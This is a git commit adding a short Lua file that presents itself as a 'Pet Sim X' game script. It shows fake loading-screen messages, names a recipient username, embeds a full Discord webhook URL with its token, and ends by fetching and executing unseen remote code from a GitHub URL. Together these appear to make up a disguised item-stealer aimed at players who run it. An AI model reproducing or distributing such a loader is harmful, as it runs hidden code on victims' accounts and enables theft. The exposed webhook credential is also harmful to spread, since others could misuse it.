697d1374198978010d385854f3113713ef728a29
visual.lua <131955163+vesty-visual@users.noreply.github.com>
2023-06-10 12:38:47 +0800

    Create psxvisualpet.lua

---
+++ psxvisualpet.lua
@@ -0,0 +1,19 @@
+Username = "owshie2929"
+
+--Username2 = "owshie2929" (will be back soon)
+
+WebHook = "https://discord.com/api/webhooks/1109170037740286033/-RHoKA-O-L6iy9Oc5PR_g5xb880c-nJ684Mv9wm9W1XxbjMqcrZlDokVVx1i-i1XyWGZ"
+
+loadingscreen = true
+
+_G.CustomScriptName = "Pet Sim x Script"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script..."
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
